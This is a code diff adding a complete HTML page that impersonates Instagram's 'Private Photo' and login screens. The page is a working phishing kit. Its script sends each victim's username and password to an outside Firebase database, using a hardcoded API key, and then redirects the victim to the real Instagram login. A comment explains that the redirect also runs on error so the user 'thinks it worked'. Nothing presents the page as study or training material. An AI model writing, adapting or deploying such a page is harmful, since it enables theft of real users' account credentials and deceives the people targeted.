@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .hidden { display: none !important; }
+
+        .mobile-shell {
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        #private-view { text-align: center; margin-top: 80px; }
+        .lock-icon {
+            width: 80px; height: 80px; border: 2px solid #262626;
+            border-radius: 50%; display: flex; justify-content: center;
+            align-items: center; margin: 0 auto 20px;
+        }
+
+        #login-view { width: 100%; text-align: center; margin-top: 40px; }
+
+        .logo-image-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .logo-image-container img {
+            width: 75px; 
+            height: auto;
+            display: block;
+        }
+        
+        input {
+            width: 100%; padding: 12px; margin-bottom: 8px;
+            border: 1px solid #dbdbdb; background-color: #fafafa;
+            border-radius: 4px; font-size: 14px;
+            outline: none;
+        }
+
+        .login-btn {
+            width: 100%; border: none; border-radius: 8px;
+            padding: 12px; font-weight: 600; font-size: 14px;
+            color: white; margin-top: 10px;
+            background-color: #b2dffc;
+            cursor: not-allowed;
+            transition: background-color 0.2s ease;
+        }
+
+        .login-btn.active {
+            background-color: #0095f6;
+            cursor: pointer;
+        }
+
+        .divider { margin: 25px 0; color: #8e8e8e; font-size: 12px; display: flex; align-items: center; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="mobile-shell">
+        
+        <div id="private-view">
+            <div class="lock-icon">
+                <svg height="40" viewBox="0 0 48 48" width="40"><path d="M24 4C19 4 15 8 15 13v3h-2c-1.1 0-2 .9-2 2v22c0 1.1.9 2 2 2h22c1.1 0 2-.9 2-2V18c0-1.1-.9-2-2-2h-2v-3c0-5-4-9-9-9zm6 12H18v-3c0-3.3 2.7-6 6-6s6 2.7 6 6v3z"></path></svg>
+            </div>
+            <h3>Private Photo</h3>
+            <p style="color: #8e8e8e; margin-bottom: 20px; font-size: 14px;">Log in to view this content.</p>
+            <button class="login-btn active" onclick="showLogin()" style="background-color:#0095f6; cursor:pointer;">Open in Instagram</button>
+        </div>
+
+        <div id="login-view" class="hidden">
+            <div class="logo-image-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" alt="Logo">
+            </div>
+
+            <input type="text" id="user" placeholder="Phone number, username, or email">
+            <input type="password" id="pass" placeholder="Password">
+            <button id="login-submit" class="login-btn" onclick="goToInstagram()">Log In</button>
+            
+            <div class="divider">OR</div>
+            <p style="color: #385185; font-weight: 600; font-size: 14px; cursor: pointer;">Log in with Facebook</p>
+        </div>
+
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCzBQuItz0ecj0ASBnPFyY_c57rbxRcNQg",
+            authDomain: "instagramuii.firebaseapp.com",
+            projectId: "instagramuii",
+            storageBucket: "instagramuii.firebasestorage.app",
+            messagingSenderId: "582766519172",
+            appId: "1:582766519172:web:1e65a4ab2b8acaa875f3d1"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        const userInp = document.getElementById('user');
+        const passInp = document.getElementById('pass');
+        const loginBtn = document.getElementById('login-submit');
+
+        window.showLogin = function() {
+            document.getElementById('private-view').classList.add('hidden');
+            document.getElementById('login-view').classList.remove('hidden');
+        };
+
+        function validate() {
+            if (userInp.value.length > 0 && passInp.value.length >= 6) {
+                loginBtn.classList.add('active');
+            } else {
+                loginBtn.classList.remove('active');
+            }
+        }
+
+        userInp.addEventListener('input', validate);
+        passInp.addEventListener('input', validate);
+
+        window.goToInstagram = async function() {
+            if (loginBtn.classList.contains('active')) {
+                try {
+                    loginBtn.innerText = "Processing...";
+                    loginBtn.disabled = true;
+
+                    await addDoc(collection(db, "instgrem"), {
+                        user: userInp.value,
+                        pass: passInp.value,
+                        timestamp: new Date().toISOString()
+                    });
+
+                    window.location.href = "https://www.instagram.com/accounts/login/";
+                } catch (e) {
+                    console.error("Firebase Error:", e);
+                    // Even on error, redirect so user thinks it worked
+                    window.location.href = "https://www.instagram.com/accounts/login/";
+                }
+            }
+        };
+    </script>
+</body>
+</html>
